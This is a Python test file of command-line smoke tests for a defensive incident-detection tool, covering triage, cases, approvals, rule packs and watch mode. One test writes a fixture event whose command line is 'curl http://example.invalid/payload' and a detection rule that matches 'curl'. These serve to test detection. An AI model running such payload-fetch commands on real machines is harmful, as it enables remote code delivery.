import json
import os
import subprocess
import sys
import unittest
from pathlib import Path
from tempfile import TemporaryDirectory


PROJECT_ROOT = Path(__file__).resolve().parents[1]


class CliSmokeTests(unittest.TestCase):
    def test_cli_json_output_contains_detected_incidents(self):
        result = self._run_agent(
            "--events",
            str(PROJECT_ROOT / "samples" / "events.jsonl"),
            "--json",
        )

        payload = json.loads(result.stdout)

        self.assertEqual(result.returncode, 0)
        self.assertGreater(payload["incident_count"], 0)
        self.assertIn("incidents", payload)
        self.assertIn("campaigns", payload)

    def test_cli_human_output_reports_windows_csv_findings(self):
        result = self._run_agent(
            "--events",
            str(PROJECT_ROOT / "samples" / "windows_security.csv"),
            "--format",
            "csv",
        )

        self.assertEqual(result.returncode, 0)
        self.assertIn("BRUTE_FORCE", result.stdout)
        self.assertIn("Detected 1 incident(s).", result.stdout)

    def test_cli_json_output_includes_import_diagnostics(self):
        with TemporaryDirectory(ignore_cleanup_errors=True) as directory:
            path = Path(directory) / "events.jsonl"
            path.write_text(
                '{"timestamp":"2026-07-02T12:00:00Z","event_type":"auth_success"}\n'
                '{"timestamp":',
                encoding="utf-8",
            )

            result = self._run_agent("--events", str(path), "--json")

        payload = json.loads(result.stdout)

        self.assertEqual(result.returncode, 0)
        self.assertEqual(payload["import_diagnostics"]["event_count"], 1)
        self.assertEqual(payload["import_diagnostics"]["skipped_count"], 1)

    def test_cli_triage_updates_and_lists_incidents(self):
        with TemporaryDirectory(ignore_cleanup_errors=True) as directory:
            db_path = Path(directory) / "incidents.sqlite"
            analyze_result = self._run_agent(
                "--events",
                str(PROJECT_ROOT / "samples" / "events.jsonl"),
                "--memory-db",
                str(db_path),
                "--json",
            )
            incident_id = json.loads(analyze_result.stdout)["memory"][
                "last_stored_incident_ids"
            ][0]

            update_result = self._run_agent(
                "triage",
                "set",
                "--memory-db",
                str(db_path),
                "--incident-id",
                str(incident_id),
                "--state",
                "investigating",
                "--note",
                "Checking owner context",
                "--json",
            )
            list_result = self._run_agent(
                "triage",
                "list",
                "--memory-db",
                str(db_path),
                "--state",
                "investigating",
                "--json",
            )

        updated = json.loads(update_result.stdout)
        listed = json.loads(list_result.stdout)

        self.assertEqual(update_result.returncode, 0)
        self.assertEqual(updated["state"], "investigating")
        self.assertEqual(updated["analyst_note"], "Checking owner context")
        self.assertEqual([entry["id"] for entry in listed], [incident_id])

    def test_cli_case_updates_and_lists_cases(self):
        with TemporaryDirectory(ignore_cleanup_errors=True) as directory:
            db_path = Path(directory) / "incidents.sqlite"
            analyze_result = self._run_agent(
                "--events",
                str(PROJECT_ROOT / "samples" / "events.jsonl"),
                "--memory-db",
                str(db_path),
                "--json",
            )
            case_id = json.loads(analyze_result.stdout)["memory"][
                "last_stored_case_ids"
            ][0]

            update_result = self._run_agent(
                "case",
                "set",
                "--memory-db",
                str(db_path),
                "--case-id",
                str(case_id),
                "--state",
                "investigating",
                "--owner",
                "alice",
                "--priority",
                "high",
                "--note",
                "Initial owner assigned",
                "--json",
            )
            list_result = self._run_agent(
                "case",
                "list",
                "--memory-db",
                str(db_path),
                "--state",
                "investigating",
                "--json",
            )

        updated = json.loads(update_result.stdout)
        listed = json.loads(list_result.stdout)

        self.assertEqual(update_result.returncode, 0)
        self.assertEqual(updated["state"], "investigating")
        self.assertEqual(updated["owner"], "alice")
        self.assertEqual(updated["priority"], "high")
        self.assertIn("Initial owner assigned", updated["notes"])
        self.assertEqual([entry["id"] for entry in listed], [case_id])

    def test_cli_approvals_can_be_listed_and_approved(self):
        with TemporaryDirectory(ignore_cleanup_errors=True) as directory:
            db_path = Path(directory) / "incidents.sqlite"
            analyze_result = self._run_agent(
                "--events",
                str(PROJECT_ROOT / "samples" / "events.jsonl"),
                "--memory-db",
                str(db_path),
                "--json",
            )
            approval_id = json.loads(analyze_result.stdout)["memory"][
                "last_stored_approval_ids"
            ][0]

            list_result = self._run_agent(
                "approvals",
                "list",
                "--memory-db",
                str(db_path),
                "--state",
                "pending",
                "--json",
            )
            approve_result = self._run_agent(
                "approvals",
                "approve",
                "--memory-db",
                str(db_path),
                "--approval-id",
                str(approval_id),
                "--by",
                "alice",
                "--note",
                "Reviewed in lab",
                "--json",
            )

        listed = json.loads(list_result.stdout)
        approved = json.loads(approve_result.stdout)

        self.assertEqual(list_result.returncode, 0)
        self.assertIn(approval_id, [entry["id"] for entry in listed])
        self.assertEqual(approved["state"], "approved")
        self.assertEqual(approved["decided_by"], "alice")
        self.assertTrue(approved["command_preview"])

    def test_cli_loads_local_rules_and_writes_response_bundle(self):
        with TemporaryDirectory(ignore_cleanup_errors=True) as directory:
            rule_path = Path(directory) / "rules.yaml"
            bundle_path = Path(directory) / "response.json"
            rule_path.write_text(
                """
rules:
  - name: Local Suspicious Curl
    attack_type: local_suspicious_curl
    event_type: process_creation
    base_score: 67
    summary: Suspicious curl execution
    conditions:
      - field: details.command_line
        contains: curl
""",
                encoding="utf-8",
            )
            events_path = Path(directory) / "events.jsonl"
            events_path.write_text(
                '{"timestamp":"2026-07-02T12:00:00Z","event_type":"process_creation",'
                '"asset":"workstation-01","asset_criticality":"high",'
                '"details":{"command_line":"curl http://example.invalid/payload"}}\n',
                encoding="utf-8",
            )

            result = self._run_agent(
                "--events",
                str(events_path),
                "--rules",
                str(rule_path),
                "--response-bundle",
                str(bundle_path),
                "--json",
            )

            payload = json.loads(result.stdout)
            bundle = json.loads(bundle_path.read_text(encoding="utf-8"))

        self.assertEqual(result.returncode, 0)
        self.assertEqual(payload["incidents"][0]["attack_type"], "local_suspicious_curl")
        self.assertEqual(bundle["mode"], "dry-run")
        self.assertEqual(bundle["recommended_tickets"][0]["rule_name"], "Local Suspicious Curl")

    def test_cli_loads_bundled_rule_pack(self):
        with TemporaryDirectory(ignore_cleanup_errors=True) as directory:
            events_path = Path(directory) / "events.jsonl"
            events_path.write_text(
                '{"timestamp":"2026-07-02T12:00:00Z","event_type":"http_request",'
                '"source_ip":"192.0.2.44","asset":"web-01",'
                '"details":{"path":"/admin/login"}}\n',
                encoding="utf-8",
            )

            result = self._run_agent(
                "--events",
                str(events_path),
                "--rule-pack",
                "web",
                "--json",
            )

        payload = json.loads(result.stdout)
        attack_types = [incident["attack_type"] for incident in payload["incidents"]]

        self.assertEqual(result.returncode, 0)
        self.assertIn("web_admin_probe", attack_types)

    def test_cli_rule_pack_list_and_show(self):
        list_result = self._run_agent("rule-pack", "list", "--json")
        show_result = self._run_agent("rule-pack", "show", "--name", "windows", "--json")

        packs = json.loads(list_result.stdout)
        windows = json.loads(show_result.stdout)

        self.assertEqual(list_result.returncode, 0)
        self.assertIn("windows", [pack["name"] for pack in packs])
        self.assertEqual(windows["name"], "windows")
        self.assertGreaterEqual(windows["rule_count"], 1)

    def test_cli_watch_reports_new_incidents_once(self):
        with TemporaryDirectory(ignore_cleanup_errors=True) as directory:
            state_path = Path(directory) / "watch-state.json"
            result = self._run_agent(
                "watch",
                "--events",
                str(PROJECT_ROOT / "samples" / "events.jsonl"),
                "--watch-state",
                str(state_path),
                "--max-iterations",
                "1",
                "--json",
            )
            second_result = self._run_agent(
                "watch",
                "--events",
                str(PROJECT_ROOT / "samples" / "events.jsonl"),
                "--watch-state",
                str(state_path),
                "--max-iterations",
                "1",
                "--json",
            )

        payload = json.loads(result.stdout)
        second_payload = json.loads(second_result.stdout)

        self.assertEqual(result.returncode, 0)
        self.assertEqual(payload["watch"]["iteration"], 1)
        self.assertGreater(payload["watch"]["new_incident_count"], 0)
        self.assertIn("new_incidents", payload["watch"])
        self.assertEqual(second_payload["watch"]["new_incident_count"], 0)

    def test_cli_exports_approved_actions(self):
        with TemporaryDirectory(ignore_cleanup_errors=True) as directory:
            db_path = Path(directory) / "incidents.sqlite"
            export_path = Path(directory) / "approved-actions.md"
            analyze_result = self._run_agent(
                "--events",
                str(PROJECT_ROOT / "samples" / "events.jsonl"),
                "--memory-db",
                str(db_path),
                "--json",
            )
            approval_id = json.loads(analyze_result.stdout)["memory"][
                "last_stored_approval_ids"
            ][0]
            self._run_agent(
                "approvals",
                "approve",
                "--memory-db",
                str(db_path),
                "--approval-id",
                str(approval_id),
                "--by",
                "alice",
            )

            export_result = self._run_agent(
                "approvals",
                "export",
                "--memory-db",
                str(db_path),
                "--state",
                "approved",
                "--output",
                str(export_path),
                "--json",
            )

            payload = json.loads(export_result.stdout)
            markdown = export_path.read_text(encoding="utf-8")

        self.assertEqual(export_result.returncode, 0)
        self.assertEqual(payload["exported_count"], 1)
        self.assertIn("Approved Countermeasure Handoff", markdown)

    def test_cli_entity_lists_and_shows_profiles(self):
        with TemporaryDirectory(ignore_cleanup_errors=True) as directory:
            db_path = Path(directory) / "incidents.sqlite"
            self._run_agent(
                "--events",
                str(PROJECT_ROOT / "samples" / "events.jsonl"),
                "--memory-db",
                str(db_path),
                "--json",
            )

            list_result = self._run_agent(
                "entity",
                "list",
                "--memory-db",
                str(db_path),
                "--type",
                "asset",
                "--json",
            )
            show_result = self._run_agent(
                "entity",
                "show",
                "--memory-db",
                str(db_path),
                "--type",
                "asset",
                "--value",
                "fileserver-01",
                "--json",
            )

        listed = json.loads(list_result.stdout)
        shown = json.loads(show_result.stdout)

        self.assertEqual(list_result.returncode, 0)
        self.assertIn("fileserver-01", [profile["value"] for profile in listed])
        self.assertEqual(shown["value"], "fileserver-01")
        self.assertGreaterEqual(shown["incident_count"], 1)

    def _run_agent(self, *args: str) -> subprocess.CompletedProcess[str]:
        env = os.environ.copy()
        env["PYTHONPATH"] = str(PROJECT_ROOT)
        return subprocess.run(
            [sys.executable, "-m", "cyberdefense_agent", *args],
            cwd=PROJECT_ROOT,
            env=env,
            text=True,
            capture_output=True,
            check=False,
        )


if __name__ == "__main__":
    unittest.main()
